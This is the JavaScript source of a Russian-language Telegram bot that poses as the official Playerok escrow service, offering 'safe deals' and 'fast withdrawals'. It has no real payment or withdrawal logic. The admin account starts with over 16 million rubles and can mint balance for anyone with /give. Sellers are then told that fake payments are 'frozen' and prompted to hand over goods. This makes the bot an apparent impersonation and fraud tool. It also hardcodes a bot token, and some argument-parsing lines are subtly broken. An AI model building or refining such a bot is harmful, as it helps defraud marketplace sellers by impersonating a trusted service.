import { Telegraf, Markup } from 'telegraf';
import fs from 'fs';

const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN_ID = 8886821631; // Твой Telegram ID

let users = {}, deals = {}, states = {};

// Железная загрузка базы данных из файла
if (fs.existsSync('database.json')) {
    try { users = JSON.parse(fs.readFileSync('database.json', 'utf8')); } catch(e) { users = {}; }
}

function saveDB() {
    fs.writeFileSync('database.json', JSON.stringify(users, null, 2));
}

function init(id, name) {
    if (!users[id]) {
        const startBalance = (id === ADMIN_ID) ? 16699677 : 0;
        users[id] = { id, username: name ? name.toLowerCase() : 'нет', balance: startBalance, count: 0 };
        saveDB();
    } else if (name) {
        users[id].username = name.toLowerCase();
        saveDB();
    }
}

const menu = Markup.keyboard([
    ['🤝 Создать сделку'],
    ['💳 Баланс', '🛡 Безопасность'],
    ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']
]).resize();

bot.start((ctx) => {
    init(ctx.from.id, ctx.from.username);
    ctx.replyWithMarkdown('Добро пожаловать 👋\n\n✅ *PlayerOk* — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n🥇 Автоматизированный алгоритм исполнения.\n🔎 Скорость и автоматизация.\n💳 Удобный и быстрый вывод средств.\n\n• Комиссия сервиса: 1%\n• Режим работы: 24/7\n• Поддержка: @sw1zyy01\n\n🛡 Выберите нужный раздел ниже:', menu);
});

bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => ctx.reply('Playerok Гарант бот, это внутренние безопасные сделки в Telegram! Все сделки и данные хранятся в базе данных Playerok. Если безопасные и быстрые сделки - то только на Playerok!'));
bot.hears('🛡 Безопасность', (ctx) => ctx.reply('Гарант Playerok - это оффициальный Гарант бот. Тут вы можете проводить безопасные сделки прямо в Telegram! Все сделки храняются на базе данных Playerok. Не ведитесь на мошенников, с любовью Playerok Гарант.'));
bot.hears('🆘 Поддержка', (ctx) => ctx.reply('Поддержка Playerok Гарант ПРЯМО в Telegram! В случай спорных моментов в сделках, обращайте модератору @sw1zyy01 с медийными доказательствами о пробелмы в сделке. С любовью - Playerok Гарант.'));

bot.hears('💳 Баланс', (ctx) => {
    init(ctx.from.id, ctx.from.username);
    const u = users[ctx.from.id];
    ctx.reply(`ℹ️ Информация о профиле:\n\n👤 Юзернейм: @${u.username}\n🆔 Ваш ID: ${ctx.from.id}\n🤝 Успешных сделок: ${u.count}\n💰 Ваш баланс: ${u.balance.toLocaleString('ru-RU')} руб.\n\n💡 Передайте ваш ID продавцу/покупателю для проведения сделки.`);
});

bot.command('give', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав.');
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply('⚠️ /give [ID] [Сумма]');
    const tId = parseInt(args), am = parseInt(args);
    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Ошибка данных.');
    init(tId, null); users[tId].balance += am; saveDB();
    ctx.reply(`✅ Начислено ${am} руб. пользователю ${tId}`);
    bot.telegram.sendMessage(tId, `💰 Баланс пополнен на: +${am} руб.`).catch(()=>{});
});

bot.hears('🤝 Создать сделку', (ctx) => {
    states[ctx.from.id] = { step: 'info' };
    ctx.replyWithMarkdown('📝 *Введите данные сделки одним сообщением.*\n\nФормат: `[Сумма] [Товар] [ID_Продавца]`\n\n📋 *Пример:* `2500 Аккаунт 8886821631` \n\n⚠️ _Важно: Продавец должен узнать свой ID в кнопке «Баланс» и запустить этого бота перед сделкой!_');
});

bot.on('text', async (ctx, next) => {
    const uid = ctx.from.id;
    const st = states[uid];
    if (!st || st.step !== 'info') return next();

    delete states[uid]; // Сразу сбрасываем режим ожидания, чтобы бот не молчал при повторном клике

    const text = ctx.message.text.trim();
    const match = text.match(/^(\d+)\s+(.+?)\s+(\d+)$/);

    if (!match) {
        return ctx.reply('❌ Неверный формат сообщения. Нажмите кнопку «🤝 Создать сделку» и попробуйте заново строго по шаблону: [Сумма] [Товар] [ID_Продавца]');
    }

    const am = parseInt(match);
    const item = match;
    const sid = parseInt(match);

    if (am <= 0) return ctx.reply('❌ Сумма должна быть больше 0.');
    if (uid === sid) return ctx.reply('❌ Нельзя создавать сделку с самим собой.');

    if (!users[sid]) {
        return ctx.reply(`❌ Продавец с ID ${sid} не найден в базе бота. Он должен сначала зайти в бота и нажать кнопку «Баланс»!`);
    }

    const dId = Math.floor(100000 + Math.random() * 900000);
    deals[dId] = { id: dId, bid: uid, sid, am, item, status: 'wait' };

    ctx.reply(`⏳ Сделка №${dId} оформлена! Ожидаем, пока продавец примет её.`);

    bot.telegram.sendMessage(sid, `🔔 *Новая сделка №${dId}!*\n\n📦 Товар: *${item}*\n💰 Сумма: *${am} руб.*\n👤 Покупатель ID: \`${uid}\`\n\nВы готовы выполнить сделку?`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]])
    }).catch(() => {
        ctx.reply('❌ Не удалось отправить уведомление продавцу.');
    });
});

bot.action(/^ok_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match), d = deals[dId];
    if (!d || ctx.from.id !== d.sid || d.status !== 'wait') return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'pay'; await ctx.answerCbQuery('✅ Сделка принята!');
    await ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте оплаты покупателем.`);
    bot.telegram.sendMessage(d.bid, `🎉 Продавец принял сделку №${dId}!\n\n📦 Товар: ${d.item}\n💰 К оплате: ${d.am} руб.\n\nНажмите кнопку ниже для оплаты товара с баланса:`, {
        ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]])
    });
});

bot.action(/^pay_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match), d = deals[dId];
    if (!d || ctx.from.id !== d.bid || d.status !== 'pay') return ctx.answerCbQuery('❌ Ошибка.');
    init(d.bid, ctx.from.username); const b = users[d.bid];
    if (b.balance < d.am) return ctx.reply(`❌ Недостаточно средств. Нужно: ${d.am} руб. Ваш баланс: ${b.balance} руб.`);
    b.balance -= d.am; d.status = 'send'; saveDB();
    await ctx.answerCbQuery('✅ Оплачено!'); await ctx.editMessageText(`💰 Сделка №${dId} оплачена! Деньги заморожены. Ожидайте передачу товара.`);
    bot.telegram.sendMessage(d.sid, `📢 Покупатель оплатил сделку №${dId}! Деньги заморожены.\n\nПередайте данные покупателю в ЛС. После передачи нажмите кнопку:`, {
        ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]])
    });
});

bot.action(/^sent_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match), d = deals[dId];
    if (!d || ctx.from.id !== d.sid || d.status !== 'send') return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'check'; await ctx.answerCbQuery('✅ Отправлено!'); await ctx.editMessageText(`👌 Вы отметили передачу товара по сделке №${dId}. Ожидайте подтверждения.`);
    bot.telegram.sendMessage(d.bid, `🔔 Продавец передал товар по сделке №${dId}!\n\nПроверьте данные и подтвердите покупку:`, {
        ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить покупку', `done_${dId}`)]])
    });
});

bot.action(/^done_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match), d = deals[dId];
    if (!d || ctx.from.id !== d.bid || d.status !== 'check') return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'end'; init(d.sid, null);
    users[d.sid].balance += d.am; users[d.bid].count++; users[d.sid].count++; saveDB();
    await ctx.answerCbQuery('🎉 Успешно!'); await ctx.editMessageText(`🎉 Сделка №${dId} успешно завершена! Деньги переведены продавцу.`);
    bot.telegram.sendMessage(d.sid, `💰 Покупатель подтвердил сделку №${dId}! Вам зачислено: +${d.am} руб.`);
});

bot.launch().then(() => console.log('🚀 Бот PlayerOk успешно запущен без ошибок!')).catch(e => console.error(e));
